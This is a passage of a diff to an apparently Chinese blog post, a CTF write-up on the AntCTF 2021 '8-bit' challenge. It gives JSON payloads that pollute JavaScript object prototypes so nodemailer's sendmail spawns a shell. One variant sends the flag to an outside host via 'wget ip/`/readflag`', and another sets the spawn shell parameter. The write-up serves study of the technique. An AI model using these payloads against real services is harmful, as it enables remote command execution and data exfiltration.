 <figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"to"</span>: <span class="string">"hachp1@qq.com"</span>,</div><div class="line">    <span class="attr">"subject"</span>: <span class="string">"test"</span>,</div><div class="line">    <span class="attr">"text"</span>: <span class="string">"xxxx"</span>,</div><div class="line">    <span class="attr">"constructor.prototype.sendmail"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"constructor.prototype.path"</span>: <span class="string">"sh"</span>,</div><div class="line">    <span class="attr">"constructor.prototype.args"</span>: [</div><div class="line">        <span class="string">"-c"</span>,</div><div class="line">        <span class="string">"/readflag&gt;/tmp/1"</span></div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>sendmail读文件：</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"to"</span>: <span class="string">"hachp1@qq.com"</span>,</div><div class="line">    <span class="attr">"subject"</span>: <span class="string">"read file"</span>,</div><div class="line">    <span class="attr">"text"</span>: &#123;<span class="attr">"path"</span>: <span class="string">"/tmp/1"</span>&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>邮件给flag：</p>
-<figure>
-<img src="http://159.75.52.53/img/blogimg/antctf2021/8bitflag.png" alt="flag"><figcaption>flag</figcaption>
-</figure>
-<h3 id="其他的解法">其他的解法</h3>
-<p>看其他战队的WP，发现还有其他的解法，可以使用dnslog、污染shell参数等。</p>
-<h4 id="dnslog">dnslog</h4>
-<ul>
+<p><img src="http://159.75.52.53/img/blogimg/antctf2021/8bitflag.png" alt="flag"></p>
+<h3 id="其他的解法"><a href="#其他的解法" class="headerlink" title="其他的解法"></a>其他的解法</h3><p>看其他战队的WP，发现还有其他的解法，可以使用dnslog、污染shell参数等。</p>
+<h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><ul>
 <li>参考<a href="https://mp.weixin.qq.com/s/oOf0RI6P2hEwtPXWP6yU4Q" target="_blank" rel="external">ChaMd5战队</a>，不用再发邮件了：</li>
 </ul>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"constructor.prototype.sendmail"</span>:<span class="literal">true</span>,</div><div class="line">    <span class="attr">"constructor.prototype.path"</span>:<span class="string">"sh"</span>,</div><div class="line">    <span class="attr">"constructor.prototype.args"</span>:[</div><div class="line">        <span class="string">"-c"</span>,<span class="string">"wget ip/`/readflag`"</span></div><div class="line">        ]</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
-<h4 id="污染-shell-参数">污染 <code>shell</code> 参数</h4>
-<ul>
+<h4 id="污染-shell-参数"><a href="#污染-shell-参数" class="headerlink" title="污染 shell 参数"></a>污染 <code>shell</code> 参数</h4><ul>
 <li>参考<a href="https://mp.weixin.qq.com/s/-hmAI1P4GClqoXsQS9HInA" target="_blank" rel="external">北极星战队</a>，<code>spawn</code>的shell参数可以指定shell的程序：</li>
 </ul>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"constructor.prototype.sendmail"</span>: <span class="number">1</span>,</div><div class="line">    <span class="attr">"constructor.prototype.shell"</span>: <span class="string">"/bin/sh"</span>, </div><div class="line">    <span class="attr">"constructor.prototype.path"</span>: <span class="string">"/readflag &gt; /tmp/jjjjjjjjJrXnm"</span>, </div><div class="line">    <span class="attr">"constructor.prototype.args"</span>: [<span class="string">""</span>]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
@@ -679,7 +660,7 @@
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy; 2022 HACHp1<br>
+            &copy; 2023 HACHp1<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
         </div>
     </div>
